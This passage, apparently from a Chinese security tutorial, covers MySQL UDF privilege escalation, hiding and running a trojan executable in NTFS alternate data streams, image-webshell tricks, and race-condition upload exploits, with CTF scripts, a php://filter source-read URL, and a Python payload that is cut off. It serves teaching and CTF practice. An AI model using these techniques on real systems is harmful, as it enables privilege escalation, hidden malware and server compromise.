</code></pre><p>如果数据库用户对数据库 mysql（注意指的是数据库里的默认库 mysql）具有 insert 和 delete 权限，就可以创建加载自定义函数。<br>而又因为 mysql 服务是以 system 权限运行在 windows 主机上，所以这个时候我们就可以通过自定义函数以 system 权限执行命令了。</p><p>Mysql 5.0.67 之前，DLL 的导入目录是 C:\windows\system32<br>从 MySQL 5.1 开始，要求目录必须是 mysql 目录下的 lib\plugin\ 目录，而且 mysql 5.1 之后的常用安装版本是默认不存在 lib\plugin 目录的。</p><p>执行 sql 语句<br><code>show variables like '%plugin%';</code></p><p>查看目录位置。<br>利用 ADS 依次创建 lib、plugin 目录</p><p><code>select 'xxx' into outfile 'E:\\phpstudy\\PHPTutorial\\MySQL\\lib\\plugin::$INDEX_ALLOCATION';</code></p><p>如果创建失败的话，执行</p><p><code>show variables like '%secure%';</code><br>看看 secure_file_priv 的值：</p><pre><code class="language-txt">null表示限制mysqld不允许导入导出
当secure_file_priv的值为/tmp/，表示限制mysqld 的导入导出只能在/tmp/目录下
当secure_file_priv的值为空，表示不对mysqld的导入导出做限制
</code></pre><ol start="5"><li>隐藏 exe 文件</li></ol><p><code>type muma.txt test.txt:muma.exe</code></p><p>在 xp 中可以用 start test.txt:muma.exe 执行，但是 win7 以上这样执行会报错。win7 及之后的系统的正确姿势如下：<br>创建一个符号链接文件 test.exe，链接到寄生的交换数据流可执行文件 test.txt:muma.exe 上：mklink test.exe,test.txt:muma.exe，然后执行 start test.exe/b 即可<br>更新一个方法：<br><code>wmic process call create &quot;C:\ProjectCode\test\test:putty.exe&quot;</code></p><pre><code class="language-txt">在WinXP中，可执行文件可以和文本文件一样实现真正的隐藏，这可能也是当时大多数杀毒软件添加数据流病毒查
杀功能的原因；在Win7之后的系统中，微软可能出于安全考虑，不允许直接运行交换数据流可执行文件，必须要
创建符号链接，这个符号链接是可见的（当然可以使用其他手段隐藏这个符号链接），并且这个符号链接创建出来
后不能复制到其他地方，只能在创建的那个位置使用命令行方式调用（鼠标双击会报错）。
</code></pre><p>查看隐藏流文件</p><pre><code class="language-txt">使用这两款小工具配合进行检测和清除寄生的交换数据流
https://pan.baidu.com/share/link?shareid=134850&amp;uk=1108295926
labs.exe检测，streams.exe进行清理。
还有一个叫做AlternateStreamView的工具也可以
</code></pre><h2 id="二次渲染绕过"><a class="anchor" href="#二次渲染绕过">#</a> 二次渲染绕过</h2><p>感觉这个的知识点偏向文件格式分析 (MISC)。在制作图片马的时候</p><p>往往是在图片后头附件一段 php 代码，或者是改包发送一个图片马。但是如果使用了二次渲染。我们上传的文件名称会被修改，并且文件末尾段一些冗余的信息（一句话木马）会被删除。</p><p>所以很明显，我们只需要将我们需要写入的东西塞在图片中间（虽然会使图片损坏，但是我们又不需要图片。。），用 winhex 或者是 010editor 等在文件内进行修改即可。</p><h2 id="条件竞争"><a class="anchor" href="#条件竞争">#</a> 条件竞争</h2><p>条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。</p><p>该漏洞一般出现在与数据库系统频繁交互的位置，例如金额同步、支付等较敏感操作处。另外条件竞争漏洞也会出现在其他位置，例如文件的操作处理等。</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># -*-coding:utf-8-*-</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> threading</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>COUNT <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">def</span> <span class="token function">Run</span><span class="token punctuation">(</span>threads_name<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">global</span> COUNT</pre></td></tr><tr><td data-num="9"></td><td><pre>    read_value <span class="token operator">=</span> COUNT</pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"COUNT in Thread-%s is %d"</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>threads_name<span class="token punctuation">)</span><span class="token punctuation">,</span> read_value<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    COUNT <span class="token operator">=</span> read_value <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    threads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        t <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>Run<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        threads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>threads<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Finally, The COUNT is %d"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>COUNT<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre></pre></td></tr><tr><td data-num="28"></td><td><pre></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token comment">#######################===== 输出结果</span></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token comment">#部分结果为：</span></pre></td></tr><tr><td data-num="31"></td><td><pre></pre></td></tr><tr><td data-num="32"></td><td><pre>        ……</pre></td></tr><tr><td data-num="33"></td><td><pre>COUNT <span class="token keyword">in</span> Thread<span class="token operator">-</span><span class="token number">9989</span> <span class="token keyword">is</span> <span class="token number">9972</span></pre></td></tr><tr><td data-num="34"></td><td><pre>COUNT <span class="token keyword">in</span> Thread<span class="token operator">-</span><span class="token number">9990</span> <span class="token keyword">is</span> <span class="token number">9973</span></pre></td></tr><tr><td data-num="35"></td><td><pre>COUNT <span class="token keyword">in</span> Thread<span class="token operator">-</span><span class="token number">9991</span> <span class="token keyword">is</span> <span class="token number">9974</span></pre></td></tr><tr><td data-num="36"></td><td><pre>COUNT <span class="token keyword">in</span> Thread<span class="token operator">-</span><span class="token number">9992</span> <span class="token keyword">is</span> <span class="token number">9975</span></pre></td></tr><tr><td data-num="37"></td><td><pre>COUNT <span class="token keyword">in</span> Thread<span class="token operator">-</span><span class="token number">9993</span> <span class="token keyword">is</span> <span class="token number">9976</span></pre></td></tr><tr><td data-num="38"></td><td><pre>COUNT <span class="token keyword">in</span> Thread<span class="token operator">-</span><span class="token number">9994</span> <span class="token keyword">is</span> <span class="token number">9977</span></pre></td></tr><tr><td data-num="39"></td><td><pre>COUNT <span class="token keyword">in</span> Thread<span class="token operator">-</span><span class="token number">9995</span> <span class="token keyword">is</span> <span class="token number">9978</span></pre></td></tr><tr><td data-num="40"></td><td><pre>COUNT <span class="token keyword">in</span> Thread<span class="token operator">-</span><span class="token number">9996</span> <span class="token keyword">is</span> <span class="token number">9979</span></pre></td></tr><tr><td data-num="41"></td><td><pre>COUNT <span class="token keyword">in</span> Thread<span class="token operator">-</span><span class="token number">9997</span> <span class="token keyword">is</span> <span class="token number">9980</span></pre></td></tr><tr><td data-num="42"></td><td><pre>COUNT <span class="token keyword">in</span> Thread<span class="token operator">-</span><span class="token number">9998</span> <span class="token keyword">is</span> <span class="token number">9981</span></pre></td></tr><tr><td data-num="43"></td><td><pre>COUNT <span class="token keyword">in</span> Thread<span class="token operator">-</span><span class="token number">9999</span> <span class="token keyword">is</span> <span class="token number">9982</span></pre></td></tr><tr><td data-num="44"></td><td><pre>Finally<span class="token punctuation">,</span> The COUNT <span class="token keyword">is</span> <span class="token number">9983</span></pre></td></tr><tr><td data-num="45"></td><td><pre></pre></td></tr><tr><td data-num="46"></td><td><pre>Process finished <span class="token keyword">with</span> exit code <span class="token number">0</span></pre></td></tr></table></figure><p>按照我们的预想，结果应该都是 10000，但是发现结果可能存在非预期解，并且出现非预期的概率还挺大的。</p><p>这是什么原因呢？</p><p>原因就在于我们没有对变量 COUNT 做同步制约，导致可能 Thread-7 在读 COUNT, 还没来得及更改 COUNT,Thread-8 抢夺资源，也来读 COUNT, 并且将 COUNT 修改为它读的结果 + 1，由此出现非预期。</p><p>同样的，WEB 应用程序因为要为很多用户服务，势必要采用多线程，但是，如果种种原因导致线程间的同步机制没处理好，那么也就会导致非预期和条件竞争的漏洞。</p><h3 id="例一金额提现"><a class="anchor" href="#例一金额提现">#</a> 例一：金额提现</h3><p>假设现有一个用户在系统中共有 2000 元可以提现，他想全部提现。于是该用户同时发起两次提现请求，第一次提交请求提现 2000 元，系统已经创建了提现订单但还未来得及修改该用户剩余金额，此时第二次提现请求同样是提现 2000 元，于是程序在还未修改完上一次请求后的余额前就进行了余额判断，显然如果这里余额判断速度快于上一次余额修改速度，将会产生成功提现的两次订单，而数据库中余额也将变为 - 2000。而这产生的后果将会是平台多向该用户付出 2000 元</p><h3 id="例二moctf里的一道题"><a class="anchor" href="#例二moctf里的一道题">#</a> 例二：moctf 里的一道题</h3><p>打开网址后一直打开的是 index2.php 修改为 index.php 后发现还是会跳转到 index2 抓包修改 index.php。</p><p><img data-src="image001.png" alt=""></p><p>发现 index.php 是一个 302 网页，因此就可以看到这里存在的一个文件 uploadsomething.php。</p><p><img data-src="image002.png" alt=""></p><p>随便填写文件名下面写入代码，再进行提交。</p><p>访问后</p><p><img data-src="image003.png" alt=""></p><p>因此这里就需要用到条件竞争，不断的向网站发送请求，然后边发送边访问。</p><p>写入一个 py 文件一直发 requests 即可</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre>url<span class="token operator">=</span><span class="token string">"http://119.23.73.3:5006/web2/uploads/b106f91010a3789acab1f27a00d67570052a7921/1.php"</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">print</span> <span class="token punctuation">(</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="image004.png" alt=""></p><h3 id="例三xman-easy-gallery"><a class="anchor" href="#例三xman-easy-gallery">#</a> 例三：XMAN-Easy Gallery</h3><p>伪协议读取代码<br><code>http://202.112.51.184:8004/index.php?page=php://filter/read=convert.base64-encode/resource=upload.php</code></p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>zh-CN<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token variable">$error</span><span class="token operator">=</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pic'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token variable">$tmpName</span><span class="token operator">=</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pic'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token variable">$name</span><span class="token operator">=</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pic'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token variable">$size</span><span class="token operator">=</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pic'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'size'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token variable">$type</span><span class="token operator">=</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pic'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">try</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token operator">!==</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token variable">$name1</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$name1</span><span class="token operator">!==</span><span class="token string double-quoted-string">".gif"</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token punctuation">(</span><span class="token variable">$name1</span><span class="token operator">!==</span><span class="token string double-quoted-string">".jpg"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hehe"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script language=javascript>alert('不允许的文件类型！');history.go(-1)&lt;/script>"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>            <span class="token keyword">exit</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token operator">!==</span><span class="token string double-quoted-string">"image/jpeg"</span><span class="token operator">&amp;&amp;</span><span class="token variable">$type</span><span class="token operator">!==</span><span class="token string double-quoted-string">"image/gif"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>            <span class="token keyword">echo</span> <span class="token function">mime_content_type</span><span class="token punctuation">(</span><span class="token variable">$tmpName</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script language=javascript>alert('不允许的文件类型！');history.go(-1)&lt;/script>"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>            <span class="token keyword">exit</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmpName</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>            <span class="token variable">$time</span><span class="token operator">=</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>            <span class="token variable">$rootpath</span><span class="token operator">=</span><span class="token string single-quoted-string">'uploads/'</span><span class="token operator">.</span><span class="token variable">$time</span><span class="token operator">.</span><span class="token variable">$name1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmpName</span><span class="token punctuation">,</span><span class="token variable">$rootpath</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script language='JavaScript'>alert('文件移动失败!');window.location='index.php?page=submit'&lt;/script>"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>                <span class="token keyword">exit</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>                <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$type</span><span class="token operator">==</span><span class="token string single-quoted-string">'image/jpeg'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="36"></td><td><pre>                <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>                    <span class="token variable">$im</span> <span class="token operator">=</span> @<span class="token function">imagecreatefromjpeg</span><span class="token punctuation">(</span><span class="token variable">$rootpath</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$im</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>                      <span class="token variable">$im</span> <span class="token operator">=</span> <span class="token function">imagecreatetruecolor</span><span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>                      <span class="token variable">$bg</span> <span class="token operator">=</span> <span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$im</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>                      <span class="token variable">$text_color</span> <span class="token operator">=</span> <span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$im</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>                      <span class="token function">imagefilledrectangle</span><span class="token punctuation">(</span><span class="token variable">$im</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token variable">$bg</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>                      <span class="token function">imagestring</span><span class="token punctuation">(</span><span class="token variable">$im</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"Error loading image"</span><span class="token punctuation">,</span> <span class="token variable">$text_color</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>                        <span class="token variable">$time</span><span class="token operator">=</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="46"></td><td><pre>                        <span class="token variable">$new_rootpath</span><span class="token operator">=</span><span class="token string single-quoted-string">'uploads/'</span><span class="token operator">.</span><span class="token variable">$time</span><span class="token operator">.</span><span class="token variable">$name1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>                        <span class="token function">imagejpeg</span><span class="token punctuation">(</span><span class="token variable">$im</span><span class="token punctuation">,</span><span class="token variable">$new_rootpath</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>                    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>                <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="50"></td><td><pre>                <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$type</span><span class="token operator">==</span><span class="token string single-quoted-string">'image/gif'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="51"></td><td><pre>                <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="52"></td><td><pre>                    <span class="token variable">$im</span> <span class="token operator">=</span> @<span class="token function">imagecreatefromgif</span><span class="token punctuation">(</span><span class="token variable">$rootpath</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="53"></td><td><pre>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$im</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="54"></td><td><pre>                      <span class="token variable">$im</span> <span class="token operator">=</span> <span class="token function">imagecreatetruecolor</span><span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="55"></td><td><pre>                      <span class="token variable">$bg</span> <span class="token operator">=</span> <span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$im</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="56"></td><td><pre>                      <span class="token variable">$text_color</span> <span class="token operator">=</span> <span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$im</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="57"></td><td><pre>                      <span class="token function">imagefilledrectangle</span><span class="token punctuation">(</span><span class="token variable">$im</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token variable">$bg</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="58"></td><td><pre>                      <span class="token function">imagestring</span><span class="token punctuation">(</span><span class="token variable">$im</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"Error loading image"</span><span class="token punctuation">,</span> <span class="token variable">$text_color</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="59"></td><td><pre>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="60"></td><td><pre>                        <span class="token variable">$time</span><span class="token operator">=</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="61"></td><td><pre>                        <span class="token variable">$new_rootpath</span><span class="token operator">=</span><span class="token string single-quoted-string">'uploads/'</span><span class="token operator">.</span><span class="token variable">$time</span><span class="token operator">.</span><span class="token variable">$name1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="62"></td><td><pre>                        <span class="token function">imagegif</span><span class="token punctuation">(</span><span class="token variable">$im</span><span class="token punctuation">,</span><span class="token variable">$new_rootpath</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="63"></td><td><pre>                    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="64"></td><td><pre>                <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="65"></td><td><pre>                <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$rootpath</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="66"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="67"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="68"></td><td><pre>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"图片ID："</span><span class="token operator">.</span><span class="token variable">$time</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="69"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="70"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="71"></td><td><pre><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="72"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="73"></td><td><pre>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ERROR"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="74"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="75"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="76"></td><td><pre> <span class="token delimiter important">?></span></pre></td></tr><tr><td data-num="77"></td><td><pre> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><p>首先是验证上传的文件是否为图片格式，如果上传了正确的图片，imagecreatefromjpeg () 返回图像资源，文件名更换为新的时间戳，用新的文件路径 newrootpath 输 出 图 片 ， 最 后 删 除 原文件 unlink (new_rootpath) 输出图片，最后删除原文件 unlink; 如果上传了不正确的图片，不会更换新的文件路径，最后还要删除源文件 unlink ($rootpath); 上传过程中存在一个延时函数 sleep (5)，所以上传的文件即使验证不成功也有 5 秒钟的时间存在。</p><p>python 的 payload。</p><figure class="highlight py"><figcaption data-lang="Python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> time</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token builtin">id</span> <span class="token operator">=</span> <span class="token builtin">int</span><span class="token 